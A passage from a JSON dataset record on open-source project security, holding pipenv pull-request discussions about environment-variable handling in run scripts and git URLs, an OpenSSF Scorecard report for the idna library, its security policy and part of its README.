                "issue_author_association": "NONE",
                "number": 4192,
                "id": 599680252,
                "state": "closed",
                "project_created_at": "2020-04-14T15:56:19Z",
                "closed_at": "2021-09-23T12:47:36Z",
                "body": "### The issue\r\nThis fixes #3901  \r\n\r\n### The fix\r\nMy code will fix the specific use case reported in the issue, however this code still requires some improvements in my opinion. Before proceeding with these improvement, I think that we should define which use cases this feature should cover.\r\n\r\nSome examples:\r\n- do we want to solve variables into the command? `${MYVAR} or $MY_VAR`\r\n- do we want to allow the execution of multiple commands if separated by semicolon? `echo \"hello\"; python --version`\r\n- do we want to allow multiple command execution with `|` or `&&` or `||` operators?\r\n\r\n### Some possible improvements\r\n- Also add a specific class to manage windows env variables\r\n- manage reserved keywords\r\n- dynamically instantiate the correct class based on the running OS\r\n\r\n### The checklist\r\n\r\n* [x] Associated issue\r\n* [x] A news fragment in the `news/` directory to describe this fix with the extension `.bugfix`, `.feature`, `.behavior`, `.doc`. `.vendor`. or `.trivial` (this will appear in the release changelog). Use semantic line breaks and name the file after the issue number or the PR #.\r\n",
                "comments": [
                    {
                        "body": "The tests fail on this one:\r\n```python\r\n@pytest.mark.cli\r\n@pytest.mark.needs_internet(reason='required by check')\r\n@flaky\r\ndef test_pipenv_check(PipenvInstance):\r\n    with PipenvInstance() as p:\r\n        p.pipenv('install requests==1.0.0')\r\n        c = p.pipenv('check')\r\n        assert c.return_code != 0\r\n        assert 'requests' in c.out\r\n        c = p.pipenv('uninstall requests')\r\n        assert c.ok\r\n        c = p.pipenv('install six')\r\n        assert c.ok\r\n        c = p.pipenv('check --ignore 35015')\r\n        assert c.return_code == 0\r\n        assert 'Ignoring' in c.err\r\n```\r\n\r\nI get an error also if I try to run the command `pipenv check` manually:\r\n```\r\n\r\nChecking PEP 508 requirements…\r\nPassed!\r\nChecking installed package safety…\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/vendor/click/core.py\", line 1066, in invoke\r\n[JSONParseError]:       return ctx.invoke(self.callback, **ctx.params)\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/vendor/click/core.py\", line 610, in invoke\r\n[JSONParseError]:       return callback(*args, **kwargs)\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/vendor/click/decorators.py\", line 73, in new_func\r\n[JSONParseError]:       return ctx.invoke(f, obj, *args, **kwargs)\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/vendor/click/core.py\", line 610, in invoke\r\n[JSONParseError]:       return callback(*args, **kwargs)\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/cli/command.py\", line 450, in check\r\n[JSONParseError]:       pypi_mirror=state.pypi_mirror,\r\n[JSONParseError]:   File \"/Users/mdeluca/_projects/pipenv/pipenv/core.py\", line 2657, in do_check\r\n[JSONParseError]:       raise exceptions.JSONParseError(c.out, c.err)\r\nFailed parsing JSON results:\r\nERROR: Your API Key '1ab8d58f-*************' is invalid. See https://goo.gl/O7Y1rS\r\n```\r\n\r\nThis doesn't look like an error related to my code, is something I am missing?\r\n\r\n",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-14T17:22:31Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-613572628"
                    },
                    {
                        "body": "See #4188 -- pipenv check is broken for the time being while the pyup.io team get around to it.",
                        "user": "chysi",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-14T20:26:49Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-613663706"
                    },
                    {
                        "body": "@chysi Thank you 😄 ",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-14T20:53:29Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-613675947"
                    },
                    {
                        "body": "I’m inclined to use structured input instead:\r\n\r\n```toml\r\nserve = {\r\n    cmd = \"uvicorn mysite:app --reload\",\r\n    env = { DEBUG = true },\r\n}\r\n```\r\n\r\nThis gets rid of all the parsing and platform-specific behaviours.\r\n\r\nMultiple commands can be supported by supplying an array to `cmd` (or we can introduce a new `cmds` key instead). A flag can be added to specify how the chain continues after an error occurs (i.e. switch between `;`, `||`, and `&&`).\r\n\r\nI don’t think it’s a good idea to re-invent Bash command parsing. Just let the user pass in something structured, it’s easier for everyone. (And by everyone I mean including the user. Most people in the world likely don’t use shell syntaxes as a native mental model, so requireing the input to be shell syntax means they also need to “serialise” their thought.)",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-24T06:40:46Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-618832265"
                    },
                    {
                        "body": "@uranusjr This makes sense, I felt like I was re-inventing the wheel.\r\nShould we also provide retro-compatibility for the commands defined as:\r\n`command = 'foo --bar=goo'` ?\r\n",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-24T20:25:14Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619223149"
                    },
                    {
                        "body": "@Hammond95 Definitely. It should continue to exist and work identically to `command = { cmd = 'foo --bar=goo' }`",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-24T20:28:06Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619224236"
                    },
                    {
                        "body": "Oh, I just spotted a mistake in my structured example. Environment variable values must be strings (of course):\r\n\r\n```toml\r\nserve = {\r\n    cmd = \"uvicorn mysite:app --reload\",\r\n    env = { DEBUG = 'true' },\r\n}\r\n```\r\n\r\nThis brings up an interesting point. We’ll either need to do some introspection before passing the env values to `subprocess` (IIRC it would crash if any value is not string), or `str(value)` on the way in. But we’ll need to handle certain values carefully if we go with the `str()` route: users might not expect `true` to become `True` when they receive it in the subprocess.\r\n",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-24T20:32:15Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619225837"
                    },
                    {
                        "body": "@uranusjr Yeah, that's a good point, I will give a look at this.\r\n\r\nAnother question:\r\nIf we run `pipenv run --help` we get\r\n```\r\nUsage: pipenv run [OPTIONS] COMMAND [ARGS]...\r\n\r\n  Spawns a command installed into the virtualenv.\r\n\r\nOptions:\r\n  --python TEXT       Specify which version of Python virtualenv should use.\r\n  --three / --two     Use Python 3/2 when creating virtualenv.\r\n  --clear             Clears caches (pipenv, pip, and pip-tools).  [env var:\r\n                      PIPENV_CLEAR]\r\n\r\n  -v, --verbose       Verbose mode.\r\n  --pypi-mirror TEXT  Specify a PyPI mirror.\r\n  -h, --help          Show this message and exit.\r\n\r\n```\r\n\r\nDoes it make sense to have the options `--python`, `--three/--two`, `--clear`, `--pypi-mirror` associated with this command?",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-24T20:47:06Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619231647"
                    },
                    {
                        "body": "> Does it make sense to have the options `--python`, `--three/--two`, `--clear`, `--pypi-mirror` associated with this command?\r\n\r\nI had a separate discussion recently with @ncoghlan about this question. The answer is 'probably not', but most likely we should address that in a separate PR since we have a lot of extra flags and arguments being passed around",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-24T22:27:47Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619264807"
                    },
                    {
                        "body": "Not sure if this requires a dedicated issue, but I have also found a possible problem in the file `project.py`:\r\n\r\nIn the method:\r\n```python3\r\n    def build_script(self, name, extra_args=None):\r\n        try:\r\n            script = Script.parse(self.parsed_pipfile[\"scripts\"][name])\r\n        except KeyError:\r\n            script = Script(name)\r\n        if extra_args:\r\n            script.extend(extra_args)\r\n        return script\r\n```\r\n\r\nin case you provide a non-existing key, pipenv will try to treat the string as a command, so the following will work as expected:\r\n\r\n`pipenv run python --version`\r\n\r\nthis won't:\r\n\r\n`pipenv run \"python --version\"`\r\n",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-24T23:23:12Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619278179"
                    },
                    {
                        "body": "> in case you provide a non-existing key, pipenv will try to treat the string as a command, so the following will work as expected:\r\n>\r\n> `pipenv run python --version`\r\n\r\nYes, This is the desired behavior\r\n\r\n> this won't: \r\n>\r\n> `pipenv run \"python --version\"`\r\n\r\nThis seems like a bug and it also seems kind of silly that we wouldn't be calling `Script.parse()` here... based on the commit history it doesn't seem like there is any reason beyond the fact that we also accept `extra_args`. I went ahead and found this instance in `core.py` where we are using the code that way (and we also test that functionality):\r\n\r\n```python\r\n    try:\r\n        script = project.build_script(command, args)\r\n        cmd_string = ' '.join([script.command] + script.args)\r\n        if environments.is_verbose():\r\n            click.echo(crayons.normal(\"$ {0}\".format(cmd_string)), err=True)\r\n    except ScriptEmptyError:\r\n        click.echo(\"Can't run script {0!r}-it's empty?\", err=True)\r\n    run_args = [script]\r\n```\r\n\r\nI vaguely recall having a conversation with @uranusjr about this and whether there is any reason not to just parse the command all the time. @uranusjr -- can you think of any reason to tackle this a bit differently? As I recall there was a reason...\r\n",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-25T01:23:06Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619298076"
                    },
                    {
                        "body": "I’m confused. Do you mean `pipenv run \"python --version\"` should call `python` with `--version` as an argument, or call an executable named `\"python --version\"`? I would definitely expect the latter, and the `build_script` implementation mentioned above looks correct to me.",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-25T07:09:03Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619333611"
                    },
                    {
                        "body": "@uranusjr Well maybe you're right and the command provided in quotes shouldn't be run as `python` with `--version` argument.\r\n\r\nBut probably we should avoid inline command execution at all 🤔 and keep that only as a \"caller\" of the keys defined in the `[scripts]` section, let me know what you think.\r\n\r\nAlso in this case the command (`pipenv run hello=world python --version`) related to the issue, will fail...\r\n\r\n",
                        "user": "Hammond95",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-04-25T15:11:30Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619393856"
                    },
                    {
                        "body": "> But probably we should avoid inline command execution at all 🤔 and keep that only as a \"caller\" of the keys defined in the `[scripts]` section, let me know what you think.\r\n\r\nHonestly, I agree (maybe except I’d keep `python`). But it’s way too late for this, unfortunately. There are simply too many people relying on this feature, removing it is not an option.",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-04-25T18:18:34Z",
                        "url": "https://github.com/pypa/pipenv/pull/4192#issuecomment-619420495"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pypa/pipenv/pulls/4192",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pypa/pipenv/pull/2710",
                "title": "Fix a bug with enviroment variable injection to the git repo url",
                "labels": [
                    "Status: Needs More Information",
                    "Type: Discussion",
                    "Category: VCS",
                    "Priority: Low",
                    "Status: Deferred / On Hold :stop_sign:",
                    "Category: Security"
                ],
                "user": "ehengao",
                "issue_author_association": "NONE",
                "number": 2710,
                "id": 348143141,
                "state": "closed",
                "project_created_at": "2018-08-07T02:27:26Z",
                "closed_at": "2021-10-26T17:43:41Z",
                "body": "Thank you for contributing to Pipenv!\r\n\r\n\r\n##### The issue\r\n\r\nFix a enviroment injection issue when dealing with git repo url dependencies. The problem issued when pipenv trying to execute command similar to \"git clone -q git+https://${USER}:${PASSWORD}/github.com\" using python subprocess.Popen, the enviroment variable inside this command is not propely resolved.Which will cause a permission deny error or a repo not found error.\r\n\r\n##### The fix\r\n\r\nusing os.path.expandvars(cmd-parts) before passing to subprocess.\r\n\r\n##### The checklist\r\n\r\n* [x] Associated issue\r\n\r\nhttps://github.com/pypa/pipenv/issues/2635 \r\n\r\n* [x] A news fragment:\r\n\r\nnews/2365.bugfix",
                "comments": [
                    {
                        "body": "By any chance we can merge this?",
                        "user": "ehengao",
                        "issue_author_association": "NONE",
                        "project_created_at": "2018-08-09T00:11:55Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-411594663"
                    },
                    {
                        "body": "I want to sit on this for a while. Generally a patch to `vendor` or `patched` is a last resort we want to avoid, since it may result in unintended subsequences.",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-08-09T04:54:32Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-411636301"
                    },
                    {
                        "body": "Interesting issue -- I'm pretty sure we're going to un-vendor pip soon though so this might not be the best approach to solving it",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-08-10T08:37:44Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-412016591"
                    },
                    {
                        "body": "Is there a fix for installing private git repos with `pipenv`? I found this issue and I'm trying to avoid rolling a private pypi just for a repo or two...",
                        "user": "pcraciunoiu",
                        "issue_author_association": "NONE",
                        "project_created_at": "2019-05-22T19:21:05Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-494933311"
                    },
                    {
                        "body": "One way is to use SSH, such as [GitHub deploy keys](https://github.blog/2015-06-16-read-only-deploy-keys/).",
                        "user": "uranusjr",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-05-23T05:05:23Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-495068531"
                    },
                    {
                        "body": "Really anything that involves putting a password in a URI directly is a bad practice, and we've had similar versions of this proposed in the past and closed for various security related reasons that I can't completely recall.  If someone can dig through the past issues on the topic it would be helpful",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-05-27T03:44:18Z",
                        "url": "https://github.com/pypa/pipenv/pull/2710#issuecomment-496067910"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pypa/pipenv/pulls/2710",
                    "merged_at": null
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 8,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "kjd/idna",
        "project_url": "https://github.com/kjd/idna",
        "SSF": {
            "date": "2024-10-29T20:30:14+07:00",
            "repo": {
                "name": "github.com/kjd/idna",
                "commit": "384f16825ef92cc08bb7e11bd42427bdaf87401d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.0,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "10 out of 10 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 1/14 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: python-humanize contributor org/company found, FactoryBoy contributor org/company found, fatiando contributor org/company found, pylast contributor org/company found, ultrajson contributor org/company found, termcolor contributor org/company found, python-twitter-tools contributor org/company found, helsinki-python contributor org/company found, django contributor org/company found, urllib3 contributor org/company found, python-pillow contributor org/company found, cycle148hki contributor org/company found, NaPoGenMo contributor org/company found, pyparsing contributor org/company found, django-auth-ldap contributor org/company found, flake8-implicit-str-concat contributor org/company found, pioneer valley books contributor org/company found, sitemorse contributor org/company found, mobbler contributor org/company found, jazzband contributor org/company found, nordsoftware contributor org/company found, python-ldap contributor org/company found, whyaretheflagsup contributor org/company found, citybikes contributor org/company found, deadsetbit contributor org/company found, railsadminteam contributor org/company found, python-hyper contributor org/company found, python-distro contributor org/company found, python contributor org/company found, unitedstates contributor org/company found, Pioneer-Valley-Books contributor org/company found, NaNoGenMo contributor org/company found, django-mptt contributor org/company found, endoflife-date contributor org/company found, requests contributor org/company found, oragono contributor org/company found, ergochat contributor org/company found, psf contributor org/company found, icann @iana-org contributor org/company found, pytest-dev contributor org/company found, WahKazoo contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 41 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.md:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE.md:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 8 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/deploy.yml:30"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/python-package.yml:33",
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/python-package.yml:35",
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/python-package.yml:39",
                        "Warn: pipCommand not pinned by hash: .github/workflows/deploy.yml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-package.yml:68",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-package.yml:69",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-package.yml:70",
                        "Info:  12 out of  12 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   3 out of   3 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 pipCommand dependencies pinned"
                    ],
                    "score": 5,
                    "reason": "dependency not pinned by hash detected -- score normalized to 5",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 22 commits out of 26 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool is not run on all commits -- score normalized to 8",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v3.10 not signed: https://api.github.com/repos/kjd/idna/releases/175132152",
                        "Warn: release artifact v3.9 not signed: https://api.github.com/repos/kjd/idna/releases/175057857",
                        "Warn: release artifact v3.8 not signed: https://api.github.com/repos/kjd/idna/releases/171699523",
                        "Warn: release artifact v3.7 not signed: https://api.github.com/repos/kjd/idna/releases/150682290",
                        "Warn: release artifact v3.10 does not have provenance: https://api.github.com/repos/kjd/idna/releases/175132152",
                        "Warn: release artifact v3.9 does not have provenance: https://api.github.com/repos/kjd/idna/releases/175057857",
                        "Warn: release artifact v3.8 does not have provenance: https://api.github.com/repos/kjd/idna/releases/171699523",
                        "Warn: release artifact v3.7 does not have provenance: https://api.github.com/repos/kjd/idna/releases/150682290"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/deploy.yml:59",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/deploy.yml:6",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/python-package.yml:11",
                        "Info: topLevel permissions set to 'read-all': .github/workflows/scorecard.yml:14"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/kjd/idna/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nSecurity updates are applied only to the latest release.\n\n## Reporting a Vulnerability\n\nIf you have discovered a security vulnerability in this project, please\nreport it privately. **Do not disclose it as a public issue.** This gives\nus time to work with you to fix the issue before public exposure, reducing\nthe chance that the exploit will be used before a patch is released.\n\nPlease disclose your issue through Github's\n[security advisory facility](https://github.com/kjd/idna/security/advisories/new).\n\nWe will endeavor to prioritize review, remediation and disclosure of\nvulnerabilites. However, be mindful that this project is maintained by a\nteam of volunteers who work on a best effort basis.",
        "project_all_labels": [
            "bug",
            "duplicate",
            "enhancement",
            "invalid",
            "question",
            "wontfix",
            "workflow"
        ],
        "README_content": "Internationalized Domain Names in Applications (IDNA)\n=====================================================\n\nSupport for the Internationalized Domain Names in\nApplications (IDNA) protocol as specified in `RFC 5891\n<https://tools.ietf.org/html/rfc5891>`_. This is the latest version of\nthe protocol and is sometimes referred to as “IDNA 2008”.\n\nThis library also provides support for Unicode Technical\nStandard 46, `Unicode IDNA Compatibility Processing\n<https://unicode.org/reports/tr46/>`_.\n\nThis acts as a suitable replacement for the “encodings.idna”\nmodule that comes with the Python standard library, but which\nonly supports the older superseded IDNA specification (`RFC 3490\n<https://tools.ietf.org/html/rfc3490>`_).\n\nBasic functions are simply executed:\n\n.. code-block:: pycon\n\n    >>> import idna\n    >>> idna.encode('ドメイン.テスト')\n    b'xn--eckwd4c7c.xn--zckzah'\n    >>> print(idna.decode('xn--eckwd4c7c.xn--zckzah'))\n    ドメイン.テスト\n\n\nInstallation\n------------\n\nThis package is available for installation from PyPI:\n\n.. code-block:: bash\n\n    $ python3 -m pip install idna\n\n\nUsage\n-----\n\nFor typical usage, the ``encode`` and ``decode`` functions will take a\ndomain name argument and perform a conversion to A-labels or U-labels\nrespectively.\n\n.. code-block:: pycon\n\n    >>> import idna\n    >>> idna.encode('ドメイン.テスト')\n    b'xn--eckwd4c7c.xn--zckzah'\n    >>> print(idna.decode('xn--eckwd4c7c.xn--zckzah'))\n    ドメイン.テスト\n\nYou may use the codec encoding and decoding methods using the\n``idna.codec`` module:\n\n.. code-block:: pycon\n\n    >>> import idna.codec\n    >>> print('домен.испытание'.encode('idna2008'))\n    b'xn--d1acufc.xn--80akhbyknj4f'\n    >>> print(b'xn--d1acufc.xn--80akhbyknj4f'.decode('idna2008'))\n    домен.испытание\n\nConversions can be applied at a per-label basis using the ``ulabel`` or\n``alabel`` functions if necessary:\n\n.. code-block:: pycon\n\n    >>> idna.alabel('测试')\n    b'xn--0zwm56d'\n\nCompatibility Mapping (UTS #46)\n+++++++++++++++++++++++++++++++\n\nAs described in `RFC 5895 <https://tools.ietf.org/html/rfc5895>`_, the\nIDNA specification does not normalize input from different potential\nways a user may input a domain name. This functionality, known as\na “mapping”, is considered by the specification to be a local\nuser-interface issue distinct from IDNA conversion functionality.\n\nThis library provides one such mapping that was developed by the\nUnicode Consortium. Known as `Unicode IDNA Compatibility Processing\n<https://unicode.org/reports/tr46/>`_, it provides for both a regular\nmapping for typical applications, as well as a transitional mapping to\nhelp migrate from older IDNA 2003 applications. Strings are\npreprocessed according to Section 4.4 “Preprocessing for IDNA2008”\nprior to the IDNA operations.\n\nFor example, “Königsgäßchen” is not a permissible label as *LATIN\nCAPITAL LETTER K* is not allowed (nor are capital letters in general).\nUTS 46 will convert this into lower case prior to applying the IDNA\nconversion.\n\n.. code-block:: pycon\n\n    >>> import idna\n    >>> idna.encode('Königsgäßchen')\n    ...\n    idna.core.InvalidCodepoint: Codepoint U+004B at position 1 of 'Königsgäßchen' not allowed\n    >>> idna.encode('Königsgäßchen', uts46=True)\n    b'xn--knigsgchen-b4a3dun'\n    >>> print(idna.decode('xn--knigsgchen-b4a3dun'))\n    königsgäßchen\n\nTransitional processing provides conversions to help transition from\nthe older 2003 standard to the current standard. For example, in the\noriginal IDNA specification, the *LATIN SMALL LETTER SHARP S* (ß) was\nconverted into two *LATIN SMALL LETTER S* (ss), whereas in the current\nIDNA specification this conversion is not performed.\n\n.. code-block:: pycon\n\n    >>> idna.encode('Königsgäßchen', uts46=True, transitional=True)\n    'xn--knigsgsschen-lcb0w'\n\nImplementers should use transitional processing with caution, only in\nrare cases where conversion from legacy labels to current labels must be\nperformed (i.e. IDNA implementations that pre-date 2008). For typical\napplications that just need to convert labels, transitional processing\nis unlikely to be beneficial and could produce unexpected incompatible\nresults.\n\n``encodings.idna`` Compatibility\n++++++++++++++++++++++++++++++++\n\nFunction calls from the Python built-in ``encodings.idna`` module are\nmapped to their IDNA 2008 equivalents using the ``idna.compat`` module.\nSimply substitute the ``import`` clause in your code to refer to the 